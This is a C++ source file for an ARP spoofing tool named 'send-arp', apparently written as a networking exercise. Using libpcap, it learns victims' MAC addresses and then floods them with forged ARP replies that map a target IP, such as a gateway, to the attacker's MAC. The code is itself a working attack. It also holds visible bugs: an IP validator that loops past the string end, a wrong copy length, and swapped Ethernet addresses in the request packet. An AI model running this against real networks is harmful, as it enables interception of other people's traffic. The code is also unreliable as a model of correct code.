#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

//The information to make the attack
typedef struct attack_info {
	Mac s_mac;
	char t_mac[6];
	char s_ip[16];
	char t_ip[16];
	uint8_t get_flag;
}attack_info;

typedef struct my_info{
	char my_mac[17];
	char my_ip[16];
}my_info;

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}


//Get my IP and MAC address
int get_myinfo(const char *interface_name, my_info* m_info){
	int sock;

	struct ifreq  ifr;

	if( (sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
        	return -1;

	}

	strncpy(ifr.ifr_name, interface_name, IFNAMSIZ);

        if( ioctl(sock, SIOCGIFHWADDR, &ifr) < 0 ) {
                return -1;
        }

        sprintf(m_info->my_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                (unsigned char)ifr.ifr_hwaddr.sa_data[0],
                (unsigned char)ifr.ifr_hwaddr.sa_data[1],
                (unsigned char)ifr.ifr_hwaddr.sa_data[2],
                (unsigned char)ifr.ifr_hwaddr.sa_data[3],
                (unsigned char)ifr.ifr_hwaddr.sa_data[4],
                (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

        if( ioctl(sock, SIOCGIFADDR, &ifr) < 0 ) {
                return -1;
        }

        sprintf(m_info->my_ip, "%d.%d.%d.%d",
        	(unsigned char)ifr.ifr_addr.sa_data[2],
                (unsigned char)ifr.ifr_addr.sa_data[3],
                (unsigned char)ifr.ifr_addr.sa_data[4],
                (unsigned char)ifr.ifr_addr.sa_data[5]);         

        close(sock);
	return 0;
}

//Build the packet to get the victim's MAC
int set_send_arp_packet(EthArpPacket * packet, attack_info * atck_info, my_info m_info, int attack_len){
	for(int i=0;i<attack_len;i++){
	
		packet[i].eth_.dmac_ = Mac(m_info.my_mac);
		packet[i].eth_.smac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet[i].eth_.type_ = htons(EthHdr::Arp);

		packet[i].arp_.hrd_ = htons(ArpHdr::ETHER);
		packet[i].arp_.pro_ = htons(EthHdr::Ip4);
		packet[i].arp_.hln_ = Mac::SIZE;
		packet[i].arp_.pln_ = Ip::SIZE;
		packet[i].arp_.op_ = htons(ArpHdr::Request);

		packet[i].arp_.smac_ = Mac(m_info.my_mac);
		packet[i].arp_.sip_ = htonl(Ip(m_info.my_ip));
		packet[i].arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet[i].arp_.tip_ = htonl(Ip(atck_info[i].s_ip));
		atck_info[i].get_flag = 0;
	}
	
	return 0;
}

//Build the packet to make attack
int set_attack_packet(EthArpPacket * packet, attack_info * atck_info, my_info m_info, int attack_len){
	for(int i=0;i<attack_len;i++){
	
		packet[i].eth_.dmac_ = atck_info[i].s_mac;
		packet[i].eth_.smac_ = Mac(m_info.my_mac);
		packet[i].eth_.type_ = htons(EthHdr::Arp);

		packet[i].arp_.hrd_ = htons(ArpHdr::ETHER);
		packet[i].arp_.pro_ = htons(EthHdr::Ip4);
		packet[i].arp_.hln_ = Mac::SIZE;
		packet[i].arp_.pln_ = Ip::SIZE;
		packet[i].arp_.op_ = htons(ArpHdr::Reply);

		packet[i].arp_.smac_ = Mac(m_info.my_mac);
		packet[i].arp_.sip_ = htonl(Ip(atck_info[i].t_ip));
		packet[i].arp_.tmac_ = Mac(atck_info[i].s_mac);
		packet[i].arp_.tip_ = htonl(Ip(atck_info[i].s_ip));
	}
	
	return 0;
}

int is_valid_ip(const char *ip) {
        int dot_count = 0;
        int value = 0;

        for (int i = 0; strlen(ip); i++) {
	        if (ip[i]>='0' && ip[i] <= '9') {
	        	value = value * 10 + (ip[i] - '0');
	        } else if (ip[i] == '.'){
	        	dot_count++;
	        	if(value < 0 || value > 255){
	        		return -1;
	        	}
	        } else {
	        	return -1;
	        }
    	}
    	if (dot_count != 3 || value < 0 || value > 255) {
        	return -1;
    	}
    	return 0; 
}

int main(int argc, char* argv[]) {
	//Check the argc
	if (argc == 2 || argc%2==1) {
		usage();
		return -1;
	}
	//IP format check
	for(int i=2;i<argc;i++){
		if(is_valid_ip(argv[i])){
			printf("Wrong IP format..\n");
			usage();
			return -1;
		}
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	//Get my ip and mac
	my_info m_info;	
	memset(m_info.my_mac, 0, sizeof(m_info.my_mac));
	memset(m_info.my_ip, 0, sizeof(m_info.my_ip));
		
	get_myinfo(dev, &m_info); 
		
	int attack_len = argc/2-1;
	
	//Allocate the memory for information to attack
	attack_info * atck_info;
	atck_info = (attack_info*)malloc(sizeof(attack_info)* attack_len);
	if(atck_info ==NULL){
		printf("attack_info is null\n");
		return -1;
	}	

	//Set the information from argv to attack info	
	for(int i=0;i<attack_len;i++){
		memcpy(atck_info[i].s_ip, argv[i*2+2], strlen(argv[i*2]));
		memcpy(atck_info[i].t_ip, argv[i*2+3], strlen(argv[i*2+3]));
		printf("s_ip = %s, d_ip = %s\n", atck_info[i].s_ip, atck_info[i].t_ip);
	} 	
	
	//EthArp has only 42 byte
	pcap_t* handle = pcap_open_live(dev, 42, 0, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	//Allocate the memory for packets
	EthArpPacket* packet_s;
	EthArpPacket* packet_a;
	packet_s = (EthArpPacket*)malloc(sizeof(EthArpPacket)*attack_len);
	set_send_arp_packet(packet_s, atck_info, m_info, attack_len);
	packet_a = (EthArpPacket*)malloc(sizeof(EthArpPacket)*attack_len);

	//Phase flag 0: get the mac, 1: set the attack packets, 2: attack
	int get_all_mac_flag =0;
	
	while(true){
		//Send the packet to get the MAC
		int cnt =0;
		if(cnt % 1000==0){
			for(int i=0;i<attack_len;i++){
				if(atck_info[i].get_flag == 0){
					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_s[i]), sizeof(EthArpPacket));
					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
				}
			}
		}

		cnt++;
		if(cnt >1000){
			cnt=0;
		}
		
		//Receive the packet
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		EthArpPacket* packet_ea = (EthArpPacket*)packet;

		//Check ARP packet
		if(packet_ea->eth_.type_ == htons(EthHdr::Arp)){
			int flag_checker =0;
			for(int i=0;i<attack_len;i++){
				//Check IP
				if(atck_info[i].get_flag ==0 && htonl(Ip(atck_info[i].s_ip)) == packet_ea->arp_.sip_){
					atck_info[i].s_mac = packet_ea->arp_.smac_;					
					atck_info[i].get_flag = 1;
					flag_checker +=1;
					printf("get victim's mac\n");
				}
			}
			//If get all victim's MAC
			if(flag_checker == attack_len){
				get_all_mac_flag =1;
			}
		}
		//Set the attack packet
		if(get_all_mac_flag==1){
			set_attack_packet(packet_a, atck_info, m_info, attack_len);
			get_all_mac_flag =2;
			printf("start to attack\n");
		}
		//Attack start
		if(get_all_mac_flag==2){
			for(int i=0;i<attack_len;i++){
				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_a[i]), sizeof(EthArpPacket));
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
			}
		}
	}
	pcap_close(handle);
	free(packet_a);
	free(packet_s);
	free(atck_info);
	
}
